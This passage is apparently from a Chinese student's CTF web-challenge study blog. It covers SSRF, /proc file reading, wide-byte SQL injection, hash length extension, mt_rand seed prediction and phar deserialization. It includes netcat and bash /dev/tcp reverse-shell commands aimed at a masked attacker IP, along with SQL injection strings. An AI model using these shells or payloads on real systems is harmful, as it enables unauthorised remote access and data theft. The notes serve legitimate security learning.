title="5.远程登录"></a>5.远程登录</h6><p>1.xshell登录（半自动化）</p><p>2.命令登录</p><p>修改权限，<strong>权限不修改成600可能会导致登录失败</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> # chmod 600 id_rsa</span><br><span class="line"> ​</span><br><span class="line"> # ssh root@[ip] -p[port] -i id_rsa</span><br><span class="line"> e.g:  ssh -i /home/cnss/.ssh/id_cnss -o StrictHostKeyChecking=no cnss@192.168.98.104</span><br><span class="line"> //StrictHostKeyChecking=no   加入此命令，实现一个非交互方式登录（题目环境需要）</span><br><span class="line"> //192.168.98.104是要登录的主机的ip，cnss@cnss_feedback_nginx</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>对linux服务器的[渗透测试]过程中，我们在getshell得到一个低权限的webshell后，由于webshell是<strong>非交互式</strong>shell，通常要反弹一个<strong>交互式</strong>的shell，然后进一步进行提权。</p><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，<strong>目标机主动发起请求到攻击机监听的端口</strong>，并将其命令行的<strong>输入输出</strong>转到攻击机。</p><p>关键是目标机有一个操作条件，可以主动发起请求，并且要能够<strong>访问外网</strong>，目标机需要是别人都能访问的外网</p><p>下面介绍几种方式</p><h6 id="netcat反弹"><a href="#netcat反弹" class="headerlink" title="netcat反弹"></a><strong>netcat反弹</strong></h6><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean</span><br></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p><strong>攻击机开启本地监听：</strong></p><p> netcat -lvvp 2333</p><p><strong>目标机主动连接攻击机：</strong></p><p> netcat 47.xxx.xxx.72 2333 -e &#x2F;bin&#x2F;bash# nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e &#x2F;bin&#x2F;bash</p><h6 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a><strong>利用Bash反弹shell</strong></h6><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p><p><strong>目标机主动连接主机：</strong></p><p> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1      &#x2F;&#x2F;或者<br> bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    </p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1   </p><p>建议用引号来包裹bash命令</p><p><strong>攻击机开启本地监听：</strong></p><p> nc -lvvp 2333</p><h2 id="Mid-CNSS-Proxy"><a href="#Mid-CNSS-Proxy" class="headerlink" title="[Mid] CNSS Proxy"></a>[Mid] CNSS Proxy</h2><h3 id="proc-directory"><a href="#proc-directory" class="headerlink" title="proc directory"></a>proc directory</h3><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>一种文件系统，一种<strong>伪文件</strong>系统（也即虚拟文件系统）伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的</p><p>用户可以通过这些文件查看有关<strong>系统硬件</strong>及当前正在<strong>运行进程</strong>的信息，甚至可以通过更改其中某些文件来改变<strong>内核</strong>的运行状态。</p><p>还有的是一些以数字命名的目录，它们是<strong>进程目录</strong>。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是<strong>读取进程信息的接口</strong>。而<strong>self</strong>目录则是<strong>读取进程本身</strong>的信息接口，是一个link。</p><h4 id="各种目录"><a href="#各种目录" class="headerlink" title="各种目录"></a>各种目录</h4><p>&#x2F;proc&#x2F;<strong>cmdline</strong></p><p>载入 kernel 时所下达的相关指令与参数！查阅此文件，可了解指令是如何启动的！</p><p>例如：pythonloader.pyc 中间空格被省略掉了，用readline能查看完整的。 此语句意思是用python运行loader.pyc</p><p><strong>&#x2F;proc&#x2F;N&#x2F;environ</strong></p><p>进程环境变量列表</p><p>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></p><p>exe 是一个指向启动当前进程的<strong>可执行文件（完整路径）</strong>的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p><p><strong>&#x2F;proc&#x2F;maps</strong></p><p>当前进程关联到的每个<strong>可执行文件和库文件</strong>在内存中的映射区域及其访问权限所组成的列表</p><p>找到&#x2F;app后的文件：app.cpython-39-x86_64-linux-gnu.so</p><p>特殊格式： .so结尾，有<strong>版本号信息</strong></p><p><strong>&#x2F;proc&#x2F;N&#x2F;fd</strong></p><p>包含进程相关的所有的<strong>文件描述符</strong></p><p>&#x2F;proc&#x2F;cpuinfo</p><p>本机的 <strong>CPU 的相关信息</strong>，包含<strong>频率</strong>、<strong>类型</strong>与<strong>运算功能</strong>等</p><p>&#x2F;proc&#x2F;modules</p><p>目前我们的 Linux 已经载入的<strong>模块列表</strong>，也可以想成是驱动程序啦！</p><p>&#x2F;<strong>proc</strong>&#x2F;fb</p><p>帧缓冲设备列表，包括数量和控制它的驱动</p><p>&#x2F;proc&#x2F;stat</p><p>系统的一些状态信息，所有的CPU活动信息</p><p><strong>&#x2F;proc&#x2F;N&#x2F;cwd</strong></p><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p><p>app.cpython-39-x86_64-linux-gnu.so</p><p>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</p><p>打开进程当前<strong>运行文件</strong></p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><p>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如<strong>文件包含</strong>漏洞，或者<strong>SSTI</strong>使用<strong>file模块</strong>，<strong>ssrf</strong>，<strong>目录穿越</strong>读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/f46efe060b8444df05d6aee5f2a9c87a.png" style="zoom:67%;" /><p>(Server-Side Request Forgery:<strong>服务器端请求伪造</strong>)</p><p>是<strong>攻击者</strong>让<strong>服务端发起构造的指定请求</strong>链接造成的漏洞。</p><p>首先要知道出现ssrf的函数基本就这几个file_get_contents()、curl()、fsocksopen()、fopen()，如果获取到题目源码了，源码中存在这些个函数就大致可以判断是否有ssrf，如果没有题目的源码，ssrf的入口一般是出现在调用外部资源的地方，比如url有个参数让你传或者是在html中的输入框，然后就用http:&#x2F;&#x2F;，file:&#x2F;&#x2F;，dict:&#x2F;&#x2F;协议读取一下。</p><p>SSRF攻击的目标是从[外网]无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 内部系统与外网隔绝，但却和服务器相连，服务器可以对内网发起请求。</p><p>ssrf就是利用我们可以访问到的服务器，对其服务器下面的内网进行探测，也可以理解为服务器拥有外网ip，而我们要访问的电脑则是在公网ip进行nat后分配的内网ip</p><ul><li>1、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li><li>2、攻击运行在内网或本地的应用程序（比如溢出）</li><li>3、对内网Web应用进行指纹识别，通过访问默认文件实现</li><li>4、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</li><li>5、利用file协议读取文件</li></ul><h4 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> /?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>理解</p><p><strong>正常访问</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6b5a90d895a54753b79e70121a3f53c3.png" style="zoom: 50%;" /><p><strong>利用ssrf漏洞</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/bb49dd7a23e3425e9c42b257856edbd1-1024x363.png" style="zoom:50%;" /><p>也就是类似于代理的东西，原来把代理服务器作为代理访问外网，现在利用ssrf访问代理服务器内网ip</p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>file:&#x2F;&#x2F; — 访问本地文件系统 +绝对路径</p><p>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</p><p>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</p><p>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流(I&#x2F;O streams)</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> /?url=127.0.0.1:xxx       //xxx进行bp爆破</span><br></pre></td></tr></table></figure><h4 id="这个题"><a href="#这个题" class="headerlink" title="这个题"></a>这个题</h4><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212020796.png"></p><p>首先0.0.0.0:5000和127.0.0.1:5000都能访问到当前页面</p><p>也就是存在ssrf注入，至于5000，是flask框架默认5000端口。</p><p>然后进行file协议拿本地文件。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212216521.png"></p><h3 id="pycdc（re）"><a href="#pycdc（re）" class="headerlink" title="pycdc（re）"></a>pycdc（re）</h3><p><strong>py编译生成，开发商为了不泄露源码，为了提高加载速度。</strong></p><p>pyc是一种<strong>二进制文件</strong>，是由py文件经过编译后，生成的文件，py文件变成pyc文件后，<strong>加载的速度有所提高</strong>，而且pyc是一种跨平台的字节码，是由[Python]的虚拟机来执行的，这个是类似于[Java]或者.NET的虚拟机的概念。pyc的内容，是跟python的<strong>版本相关</strong>的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的python是无法执行的。</p><p>可以反编译：pycdc。</p><h3 id="cython"><a href="#cython" class="headerlink" title="cython"></a>cython</h3><p><strong>用python语法写c拓展，可以直接被python调用（import）</strong>，<strong>但是要注意版本号</strong></p><p>Cython是一个<strong>编程语言</strong>，它通过<strong>类似Python的语法来编写C扩展并可以被Python调用</strong>.既具备了Python快速开发的特点，又可以让代码运行起来像C一样快，同时还可以方便地调用C library。</p><h3 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h3><p>Python的常用<strong>框架</strong>，，轻量级，两个主要核心应用是Werkzeug和模板引擎Jinja.</p><p>（dd）</p><h2 id="Mid-CNSS-Database"><a href="#Mid-CNSS-Database" class="headerlink" title="[Mid] CNSS Database"></a>[Mid] CNSS Database</h2><p>“不会用了 <strong>Prepared Statement</strong> 你还能注入我吧”</p><h4 id="Prepared-Statement"><a href="#Prepared-Statement" class="headerlink" title="Prepared Statement"></a>Prepared Statement</h4><h5 id="预编译语句"><a href="#预编译语句" class="headerlink" title="预编译语句"></a>预编译语句</h5><p>通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：</p><ol><li>词法和语义解析</li><li>优化sql语句，制定执行计划</li><li>执行并返回结果</li></ol><p>这是普通语句称作<strong>Immediate Statements</strong>，就是没有经过预编译，直接将语句过滤优化后传给数据库，就有可能让数据被当成sql语句代码执行（也就是数据变成了代码）？</p><p>但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。 如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句<strong>模板化或者说参数化</strong>，一般称这类语句叫<strong>Prepared Statements</strong>或者<strong>Parameterized Statements</strong> 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；预编译是用来提升SQL语句的响应速度的，将一段SQL语句定制成模板，把灵活的参数作为[占位符]让我们传递进去，达到多次执行相同的SQL语句必须要重复校验、解析等操作；</p><p><strong>此外预编译语句能防止sql注入。</strong>为什么？</p><p>进行预编译之后，[sql语句]已经被数据库<strong>分析，编译和优化</strong>了，并且允许数据库以参数化的形式进行查询，所以即使有敏感字符数据库<strong>也会当做属性值</strong>来处理而不是sql指令了</p><p>输入的数据被放进占位符里面，整个sql语句结构不会改变，也就不存在闭合的说法，相当于输入的东西只能作为属性值（数据）执行，而不能变成代码语句</p><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>我们可以看到输出的SQL文是<strong>把整个参数用引号包起来</strong>，并把<strong>参数中的引号作为转义字符</strong>，从而避免了参数也作为条件的一部分</p><p>绕过需要两点，防止引号被转义，然后闭合语句 防止转义&#x3D;》宽字节注入</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>先总结sql注入总共有哪些类型：</p><p><strong>数字型注入： or 1&#x3D;1</strong> 在输入整形参数的地方</p><p><strong>字符型注入： ‘ or 1&#x3D;1#</strong> 需要闭合引号</p><p>**搜索型注入： %xxx% or 1&#x3D;1 #%&amp;**amp;#x27; 需要闭合%</p><p><strong>XX型注入： xx’) or 1&#x3D;1#</strong> 需要闭合奇怪的东西</p><p>方法：</p><p><strong>联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、二次注入，偏移注入</strong></p><p><strong>宽字节注入（⛔必须是GBK ⛔在 ‘ 前加 %df 用于绕过 )</strong></p><p><strong>其中 \ 的URL编码是 %5C ，当我们在单引号前面加上 %df 的时候，最终就会变成 運’，如果程序的默认字符集是GBK等宽字节字符集，则 MYSQL 用 GBK 的编码时，会认为 %df 是一个宽字符，也就是 運，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</strong></p><p>也就是本来单引号前面会有一个&#x2F;来转义，但是利用gbk中支持宽字节，再加一个让&#x2F;和%df变成宽字节，然后引号就逃逸了</p><h4 id="pdo预处理"><a href="#pdo预处理" class="headerlink" title="pdo预处理"></a>pdo预处理</h4><p><strong>而PDO作为php中最典型的预编译查询方式</strong></p><p>这个和预编译很像，如果理解不到位，只是简单使用PDO，就和addslashes()一样只是将引号转义了，</p><p>实际上，在模拟预编译的情况下，PDO对于SQL注入的防范（PDO::queto()），无非就是将数字型的注入转变为字符型的注入，又用类似mysql_real_escape_string()的方法将单引号、双引号、反斜杠等字符进行了转义。</p><p>将一些参数修改之后，就会发现不论输入什么都会被当成数据处理（十六进制转码）</p><p>正因为上面这句话，</p><p>Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。</p><h2 id="Mid-ezpad"><a href="#Mid-ezpad" class="headerlink" title="[Mid] ezpad"></a>[Mid] ezpad</h2><h3 id="脚本爆破"><a href="#脚本爆破" class="headerlink" title="脚本爆破"></a>脚本爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&#x27;/^2022(.*?)CNSS$/&#x27;, $cnss)) </span><br><span class="line"> ​</span><br><span class="line">     if (md5($cnss) === &#x27;a5e8a02c361fb593dae3f3ee3256de0f&#x27;)   &#123;</span><br><span class="line"> ​</span><br><span class="line">             echo md5($flag); &#125;</span><br></pre></td></tr></table></figure><p>cnss格式要求为：2022CNSS，在这种基础下破解md5，只能考虑脚本爆破</p><p>附上抄的xl脚本(夏令营)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> #!/usr/bin/env python</span><br><span class="line"> # -*- coding:utf-8 -*-</span><br><span class="line"> # auther:youzhi</span><br><span class="line"> # time:2022/9/17</span><br><span class="line"> import string</span><br><span class="line"> import hashlib</span><br><span class="line"> payload = string.ascii_letters +string.digits+&quot;_&quot;</span><br><span class="line"> def calc_md5(s):</span><br><span class="line">     md5 = hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">     if(md5 == &quot;8cd38fa45e987e3ed7d523bbd40ce74a&quot;):</span><br><span class="line">         print(s)</span><br><span class="line"> def getstr(payload, s, slen):</span><br><span class="line">     if(len(s) == slen):</span><br><span class="line">         #print(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;)            一个递归</span><br><span class="line">         calc_md5(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;) </span><br><span class="line">         return s</span><br><span class="line">     for i in payload:</span><br><span class="line">         sl = s + i</span><br><span class="line">         getstr(payload, sl, slen)</span><br><span class="line"> for i in range(25, 26):</span><br><span class="line">     getstr(payload,&#x27;&#x27;, i)</span><br></pre></td></tr></table></figure><h3 id="intval绕过"><a href="#intval绕过" class="headerlink" title="intval绕过"></a>intval绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> intval($cnss) === intval(strrev($cnss)      //intval(2022***CNSS)===intval(CNSS***2022)</span><br></pre></td></tr></table></figure><p>intval()函数将参数id转换为数值型 strrev将字符串取反</p><p>前者至少2022往后，后者为零，现在需要让前者为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> #intval有一些漏洞</span><br><span class="line"> 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 </span><br><span class="line"> #有些时候返回最大值，有些时候返回0（取决于字符串最左侧的字符）</span><br><span class="line"> 空数组也会返回0，非空数组返回1，此处不能是空数组，因此不能利用这个绕过</span><br><span class="line"> 2022e***(数字)</span><br><span class="line"> 变成指数形式  是指以10为底的指数。代表的就是科学记数法，e5就代表10^5</span><br></pre></td></tr></table></figure><h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><p>（hash length extension）</p><p><strong>指针对某些允许包含额外信息的<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>散列函数的攻击手段。次攻击适用于MD5和SHA-1等基于Merkle–Damgård构造的算法</strong></p><p>哈希摘要算法，如MD5,SHA1, SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：如果你知道message和MAC，只需再知道key的长度，尽管不知道key的值，也能在message后面添加信息并计算出相应MAC。</p><p>Example: message + padding +extension</p><h4 id="hash加密原理"><a href="#hash加密原理" class="headerlink" title="hash加密原理"></a>hash加密原理</h4><p>我们需要了解以下几点md5加密过程：</p><blockquote><p>MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</p><p>关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</p><p>MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量。</p></blockquote><p>举一个例子讲一下如何填充：比如字符串“Acker” 十六进制0x41636b6572这里与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure><p>此处补充：以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4&#x3D;512这就是一组，正好是512bit。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320532282.jpg"></p><p>上图中的8是因为补位时二进制第一位要补1，那么1000转换成16进制就是8.后面都补上0.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320602395.jpg"></p><p>填充数据最后8字节长度，Acker长度为5*8&#x3D;40bit，又因为0x28&#x3D;40所以16进制显示为28.</p><p>为什么数据会在左端：MD5中储存的都是小端方式，比如0x12345678，那么md5存储顺序就是0x78563412</p><h4 id="MD5拓展攻击演示"><a href="#MD5拓展攻击演示" class="headerlink" title="MD5拓展攻击演示"></a><strong>MD5拓展攻击演示</strong></h4><p>下图为加密流程图，可以更直观看清楚整个流程。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320694308.jpg"></p><p>选一个字符串例如“Acker”MD5（“Acker”）&#x3D; dee2fb2df156f4040f893d8a10ac1034</p><p>现在我们不需要知道字符串是什么。只需要知道其长度，并将字符串填充完，新加一个字符串如：addition，之前得到的“Acker”MD5值作为最后一块加密的初始向量，最后得到的结果和MD5（“Acker+addition”）是一样的。</p><h2 id="Mid-Pesudo2"><a href="#Mid-Pesudo2" class="headerlink" title="[Mid] Pesudo2"></a>[Mid] Pesudo2</h2><h4 id="PHP-Filter伪协议"><a href="#PHP-Filter伪协议" class="headerlink" title="PHP Filter伪协议"></a>PHP Filter伪协议</h4><p><code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在<strong>读取和写入</strong>之前对数据进行一些<strong>过滤</strong>，例如<code>base64</code>编码处理，<code>rot13</code>处理等。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602132307452-8926922491.png"></p><p>伪协议小总结：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602133612437-163441181.png"></p><p>（后面再来细说）</p><h4 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h4><p>mt_srand()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> mt_srand() 函数播种 Mersenne Twister 随机数生成器。</span><br><span class="line"> 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。</span><br></pre></td></tr></table></figure><p>在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点。</p><p>mt_rand()的生成的随机数只跟<strong>seed</strong>和<strong>调用该函数的次数</strong>有关</p><p>只需要知道一个随机数，就可以利用工具反推出可能的种子，知道种子，随机数就不算随机数了。</p><p>本题通过第一个随机数猜测出seed，再算第114514次的，完工。</p><h2 id="Mid-Best-Language"><a href="#Mid-Best-Language" class="headerlink" title="[Mid] Best Language"></a>[Mid] Best Language</h2><h3 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h3><h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><h5 id="为什么反序列化？"><a href="#为什么反序列化？" class="headerlink" title="为什么反序列化？"></a>为什么反序列化？</h5><p><strong>1.存储需求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  “所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。”</span><br><span class="line"> 在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</span><br></pre></td></tr></table></figure><p><strong>2.传输需求</strong></p><p>序列化说通俗点就是<strong>把一个对象变成可以传输的字符串</strong>。举个例子，不知道大家知不知道json格式，这就是一种序列化，有可能就是通过array序列化而来的。而反序列化就是把那串可以传输的字符串再变回对象。</p><p>这样就让对象能够以<strong>字节流</strong>的形式传输。</p><h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221022110413532-1024x394.png"></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种<strong>打包文件</strong>。如果你使用的是 PHP 5.3 或更高版本，那么Phar后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。</p><p>PHAR文件缺省状态是只读的，使用Phar文件不需要任何的配置。部署非常方便。因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p><p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> phar.readonly = 0</span><br></pre></td></tr></table></figure><p>现在，我们就可以来把PHP应用打包成Phar文件了。</p><p>——————————————————————————————————————————</p><p>PHAR文件是一种<strong>打包格式</strong>，通过将多数PHP文件和其他资源（如图像）捆绑到一个归档文件中来实现应用程序和库的分发。且所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的php代码。</p><p>PHAR存档最有特色的一种方便的方法是将多个文件分组为一个文件。这样，PHAR存档提供了一种<strong>将完整的php应用程序分发到单个文件中并从该文件运行</strong>它的方法，而无需将其提取到磁盘。</p><p>PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行PHAR存档。</p><h4 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h4><p><strong>PHAR:&#x2F;&#x2F;协议</strong></p><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p><p><strong>利用函数</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20200415221922550.png"></p><p><strong>姿势1:绕过上传限制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 1.使用Phar://伪协议流可以绕过一些上传限制，大多数情况下和文件包含一起使用</span><br></pre></td></tr></table></figure><h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><strong>姿势2:[反序列化]漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> # 漏洞触发</span><br><span class="line"> 利用Phar:// 伪协议读取phar文件时</span><br><span class="line"> 会反序列化meta-data储存信息</span><br></pre></td></tr></table></figure><p>meta-data是以序列化的形式存储的。 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>烧</title>
      <link href="/2023/05/14/%E7%83%A7/"/>
      <url>/2023/05/14/%E7%83%A7/</url>
      
